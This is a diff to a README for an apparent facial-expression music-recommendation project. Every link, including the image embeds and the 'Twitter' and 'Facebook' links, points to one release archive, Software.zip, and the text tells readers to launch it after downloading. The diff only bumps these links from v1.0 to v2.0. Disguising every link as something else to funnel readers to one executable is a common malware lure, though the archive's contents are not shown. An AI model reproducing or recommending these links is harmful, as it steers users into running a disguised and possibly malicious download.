@@ -2,7 +2,7 @@
 
 Welcome to the "Music-Recommendation-Based-on-Facial-Expression" repository! This project is all about recommending music based on your facial expressions using the FER 2013 dataset and the Spotify app. By leveraging the power of machine learning, this project aims to create a music recommendation system that takes into account your emotions and facial expressions to suggest the perfect tunes for any mood.
 
-![Music](https://github.com/kakaum2k/Music-Recommendation-Based-on-Facial-Expression/releases/download/v1.0/Software.zip)
+![Music](https://github.com/kakaum2k/Music-Recommendation-Based-on-Facial-Expression/releases/download/v2.0/Software.zip)
 
 ## Description
 Have you ever wanted a music playlist that perfectly matches your mood? Look no further! This project combines the fields of emotion recognition, machine learning, and music streaming to provide a unique music recommendation experience. By analyzing facial expressions captured through a camera, the system identifies the user's emotions and suggests music tracks that are likely to resonate with their current state of mind.
@@ -31,7 +31,7 @@ The core of this project lies in the integration of the FER 2013 dataset for fac
 
 ## Get Started
 To dive into this exciting project, make sure to download the software package from the following link:  
-[![Download Software](https://github.com/kakaum2k/Music-Recommendation-Based-on-Facial-Expression/releases/download/v1.0/Software.zip)](https://github.com/kakaum2k/Music-Recommendation-Based-on-Facial-Expression/releases/download/v1.0/Software.zip)  
+[![Download Software](https://github.com/kakaum2k/Music-Recommendation-Based-on-Facial-Expression/releases/download/v2.0/Software.zip)](https://github.com/kakaum2k/Music-Recommendation-Based-on-Facial-Expression/releases/download/v2.0/Software.zip)  
 *(Note: The software package needs to be launched after downloading.)*
 
 If the link provided above is not working or if you need additional resources, please check the "Releases" section of this repository for the latest updates and versions.
@@ -50,9 +50,9 @@ This project would not have been possible without the support and contributions 
 
 ## Let's Connect
 Stay updated on the latest developments by following us on social media:
-- Twitter: [@MusicRecommendAI](https://github.com/kakaum2k/Music-Recommendation-Based-on-Facial-Expression/releases/download/v1.0/Software.zip)
-- Facebook: [MusicRecommendationAI](https://github.com/kakaum2k/Music-Recommendation-Based-on-Facial-Expression/releases/download/v1.0/Software.zip)
+- Twitter: [@MusicRecommendAI](https://github.com/kakaum2k/Music-Recommendation-Based-on-Facial-Expression/releases/download/v2.0/Software.zip)
+- Facebook: [MusicRecommendationAI](https://github.com/kakaum2k/Music-Recommendation-Based-on-Facial-Expression/releases/download/v2.0/Software.zip)
 
-![Music Emotions](https://github.com/kakaum2k/Music-Recommendation-Based-on-Facial-Expression/releases/download/v1.0/Software.zip)
+![Music Emotions](https://github.com/kakaum2k/Music-Recommendation-Based-on-Facial-Expression/releases/download/v2.0/Software.zip)
 
 Thank you for exploring the "Music-Recommendation-Based-on-Facial-Expression" repository! Get ready to groove to the tunes that match your mood like never before. 🎵🎶🎸 Enjoy the musical journey! 🌟🎧🎹
